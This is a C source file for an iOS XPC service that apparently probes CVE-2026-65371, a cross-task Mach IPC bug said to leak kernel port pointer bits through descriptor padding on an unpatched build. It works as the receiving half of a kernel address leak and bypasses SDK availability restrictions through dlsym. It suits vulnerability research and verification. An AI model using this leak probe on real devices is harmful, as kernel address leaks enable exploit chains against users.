/*
 * Probe65371/main.c — embedded XPC service for cross-task Mach IPC pad1 test.
 *
 * CVE-2026-65371: ipc_kmsg_copyin_body() stores full 8-byte ipc_port* at
 * [desc+0..7] during copyin. On 23F77 (unpatched), ipc_kmsg_copyout_body()
 * copies the kernel descriptor (including pad1 = ipc_port* upper 32 bits at
 * [desc+4..7]) to the RECEIVER's address space via copyout() before zeroing
 * the kernel buffer. For cross-task IPC the receiver sees pad1 != 0 (kernel
 * VA leak). Same-task uses an optimised delivery path that avoids the bulk
 * copyout before cleanup -> pad1=0 there.
 *
 * Protocol:
 *   host -> service : {"cmd":"probe"}
 *   service -> host : {"status":"ready", "probe_port":<send_right>}
 *   host   (mach_msg, cross-task): 4 PORT descriptors -> probe_port
 *   service -> host : {"status":"done", "desc_count":4,
 *                      "desc0_portname":…, "desc0_pad1":…, …}
 */

#include <xpc/xpc.h>
#include <mach/mach.h>
#include <dispatch/dispatch.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

/*
 * xpc_main() and xpc_connection_create_mach_service() are present in iOS's
 * libxpc at runtime but are marked API_UNAVAILABLE(ios) in the public SDK
 * headers to discourage third-party use.  We retrieve them at runtime via
 * dlsym to avoid the compile-time availability error.
 */
typedef void (*xpc_main_fn_t)(xpc_connection_handler_t handler);
typedef xpc_connection_t (*xpc_create_svc_fn_t)(const char *name,
                                                 dispatch_queue_t targetq,
                                                 uint64_t flags);
#define XPC_MACH_SERVICE_LISTENER 1ULL  /* XPC_CONNECTION_MACH_SERVICE_LISTENER */

#define MAX_DESCS        8
#define RECV_BUF_SIZE    4096
#define RECV_TIMEOUT_MS  12000

typedef struct {
    xpc_connection_t conn;
    mach_port_t      recv_port;
} probe_ctx_t;

static void *receive_thread(void *arg) {
    probe_ctx_t *ctx = (probe_ctx_t *)arg;

    uint8_t buf[RECV_BUF_SIZE] __attribute__((aligned(8)));
    memset(buf, 0, sizeof(buf));

    mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
    kern_return_t kr = mach_msg(
        hdr,
        MACH_RCV_MSG | MACH_RCV_TIMEOUT,
        0,
        RECV_BUF_SIZE,
        ctx->recv_port,
        RECV_TIMEOUT_MS,
        MACH_PORT_NULL
    );

    xpc_object_t result = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(result, "status", "done");

    if (kr != MACH_MSG_SUCCESS) {
        char errbuf[64];
        snprintf(errbuf, sizeof(errbuf), "mach_msg_receive kr=0x%x", (unsigned)kr);
        xpc_dictionary_set_string(result, "error", errbuf);
    } else {
        /*
         * Message layout after mach_msg_receive:
         *   [  0..23]: mach_msg_header_t (24 bytes)
         *   [ 24..27]: mach_msg_body_t   (4 bytes, msgh_descriptor_count)
         *   [ 28..39]: desc[0]           (12 bytes: portname[0..3], pad1[4..7],
         *                                           pad2[8..9], disp[10], type[11])
         *   [ 40..51]: desc[1]           …
         *   …
         *
         * On 23F77 (unpatched), cross-task copyout writes ipc_port* upper 32 bits
         * into pad1 (bytes [4..7]) of each received descriptor.
         */
        uint32_t desc_count = 0;
        memcpy(&desc_count, buf + 24, 4);
        if (desc_count > MAX_DESCS) desc_count = MAX_DESCS;

        xpc_dictionary_set_uint64(result, "desc_count", desc_count);
        xpc_dictionary_set_uint64(result, "msg_id",     (uint64_t)hdr->msgh_id);
        xpc_dictionary_set_uint64(result, "msg_size",   (uint64_t)hdr->msgh_size);

        for (uint32_t i = 0; i < desc_count; i++) {
            size_t base = 28 + (size_t)i * 12;
            if (base + 12 > RECV_BUF_SIZE) break;

            uint32_t portname    = 0;
            uint32_t pad1        = 0;
            uint8_t  disposition = 0;
            uint8_t  type        = 0;
            memcpy(&portname,    buf + base,      4);
            memcpy(&pad1,        buf + base + 4,  4);
            memcpy(&disposition, buf + base + 10, 1);
            memcpy(&type,        buf + base + 11, 1);

            char key[48];
            snprintf(key, sizeof(key), "desc%u_portname", i);
            xpc_dictionary_set_uint64(result, key, portname);
            snprintf(key, sizeof(key), "desc%u_pad1", i);
            xpc_dictionary_set_uint64(result, key, pad1);
            snprintf(key, sizeof(key), "desc%u_disp", i);
            xpc_dictionary_set_uint64(result, key, disposition);
            snprintf(key, sizeof(key), "desc%u_type", i);
            xpc_dictionary_set_uint64(result, key, type);
        }

        /* Raw descriptor bytes for diagnostic hexdump on the host */
        size_t raw_len = (size_t)desc_count * 12;
        if (raw_len > 0 && 28 + raw_len <= RECV_BUF_SIZE) {
            xpc_object_t raw = xpc_data_create(buf + 28, raw_len);
            xpc_dictionary_set_value(result, "raw_descs", raw);
            xpc_release(raw);
        }
    }

    xpc_connection_send_message(ctx->conn, result);
    xpc_release(result);

    /* Release the receive right we allocated in handle_message */
    mach_port_destroy(mach_task_self(), ctx->recv_port);
    free(ctx);
    return NULL;
}

static void handle_message(xpc_connection_t conn, xpc_object_t msg) {
    if (xpc_get_type(msg) != XPC_TYPE_DICTIONARY) return;
    const char *cmd = xpc_dictionary_get_string(msg, "cmd");
    if (!cmd || strcmp(cmd, "probe") != 0) return;

    /* Allocate the probe receive port */
    mach_port_t recv = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(),
                                          MACH_PORT_RIGHT_RECEIVE, &recv);
    if (kr != KERN_SUCCESS) {
        xpc_object_t err = xpc_dictionary_create(NULL, NULL, 0);
        xpc_dictionary_set_string(err, "status", "done");
        xpc_dictionary_set_string(err, "error",  "mach_port_allocate failed");
        xpc_connection_send_message(conn, err);
        xpc_release(err);
        return;
    }

    /* Insert a MAKE_SEND right so we can send the send right to the host */
    kr = mach_port_insert_right(mach_task_self(), recv, recv,
                                MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        mach_port_destroy(mach_task_self(), recv);
        xpc_object_t err = xpc_dictionary_create(NULL, NULL, 0);
        xpc_dictionary_set_string(err, "status", "done");
        xpc_dictionary_set_string(err, "error",  "mach_port_insert_right failed");
        xpc_connection_send_message(conn, err);
        xpc_release(err);
        return;
    }

    /*
     * Launch the receive thread BEFORE sending the port to the host, so we are
     * already blocked in mach_msg_receive by the time the host sends its message.
     */
    probe_ctx_t *ctx = malloc(sizeof(probe_ctx_t));
    ctx->conn      = conn;
    ctx->recv_port = recv;

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    pthread_t thread;
    pthread_create(&thread, &attr, receive_thread, ctx);
    pthread_attr_destroy(&attr);

    /*
     * Send the port's send right to the host.  xpc_dictionary_set_mach_send
     * transfers a copy of the send right; the service retains the receive right.
     */
    xpc_object_t ready = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(ready, "status", "ready");
    xpc_dictionary_set_mach_send(ready, "probe_port", recv);
    xpc_connection_send_message(conn, ready);
    xpc_release(ready);
}

static void handle_connection(xpc_connection_t peer) {
    xpc_connection_set_event_handler(peer, ^(xpc_object_t event) {
        if (xpc_get_type(event) == XPC_TYPE_DICTIONARY)
            handle_message(peer, event);
    });
    xpc_connection_resume(peer);
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;

    /* Try xpc_main() first — it is the canonical XPC service entry point. */
    xpc_main_fn_t xpc_main_ptr =
        (xpc_main_fn_t)(uintptr_t)dlsym(RTLD_DEFAULT, "xpc_main");

    if (xpc_main_ptr) {
        xpc_main_ptr(handle_connection);
        __builtin_unreachable();
    }

    /*
     * Fallback: xpc_main not found (should not happen on modern iOS).
     * Create the mach-service listener manually and spin dispatch_main().
     */
    xpc_create_svc_fn_t make_svc =
        (xpc_create_svc_fn_t)(uintptr_t)dlsym(RTLD_DEFAULT,
                                               "xpc_connection_create_mach_service");
    if (make_svc) {
        xpc_connection_t listener = make_svc(
            "com.mak5er.Pocket-Poster.Probe65371",
            dispatch_get_main_queue(),
            XPC_MACH_SERVICE_LISTENER
        );
        xpc_connection_set_event_handler(listener, ^(xpc_object_t event) {
            if (xpc_get_type(event) == XPC_TYPE_CONNECTION)
                handle_connection((xpc_connection_t)event);
        });
        xpc_connection_resume(listener);
    }

    dispatch_main();
    return 0;
}
